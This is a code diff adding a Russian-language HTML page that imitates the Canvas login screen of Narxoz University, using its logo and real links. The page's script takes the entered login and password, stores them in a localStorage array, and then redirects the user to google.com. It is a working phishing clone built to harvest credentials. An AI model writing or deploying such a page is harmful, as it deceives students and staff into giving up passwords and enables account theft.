@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Войти в систему Canvas</title>
+    <link href="favicon-e10d657a73.ico" rel="icon">
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="auth-box">
+        <div class="fa">
+            <div class="icon">
+                <img src="Narxoz_University_Logo_2020 (1).png" width="240" height="90" alt="Narxoz University Logo">
+            </div>
+            <a class="gg" href="https://canvas.narxoz.kz/search/all_courses">Искать курсы</a>
+            <h6 class="llogin" for="log">Введите логин</h6>
+            <input class="login" type="text" id="log" name="login">
+            <h6 class="lpass" for="pass">Пароль</h6>
+            <input class="pass" type="password" id="pass" name="password">
+            <br><input class="checkbox" type="checkbox" id="stayLoggedIn"><label class="chek" for="stayLoggedIn">Оставаться в системе</label><br>
+            <br><a href="https://canvas.narxoz.kz/login/canvas#" class="dd">Забыли пароль?</a><br>
+            <button class="bot" type="button" onclick="saveCredentials()" onclick="redirectToGoogle()">Войти</button>
+        </div>
+        <br><a class="a1" href="http://instructure.com/">LMS с открытым исходным кодом.</a><a class="a2" href="https://canvas.narxoz.kz/login/canvas#">Справка</a><br>
+        <a href="http://www.instructure.com/"><img src="sa.png" class="sa" ></a>
+    </div>
+    <script>
+        function redirectToGoogle() {
+            window.location.href = 'https://www.google.com';
+}
+        function saveCredentials() {
+            // Получаем введённые данные
+            const login = document.getElementById('log').value;
+            const password = document.getElementById('pass').value;
+
+            // Получаем массив данных из localStorage (или создаём новый массив, если данных нет)
+            let credentialsArray = JSON.parse(localStorage.getItem('credentials')) || [];
+
+            // Добавляем новый логин и пароль в массив
+            credentialsArray.push({ login: login, password: password });
+
+            // Сохраняем обновлённый массив в localStorage
+            localStorage.setItem('credentials', JSON.stringify(credentialsArray));
+            window.location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
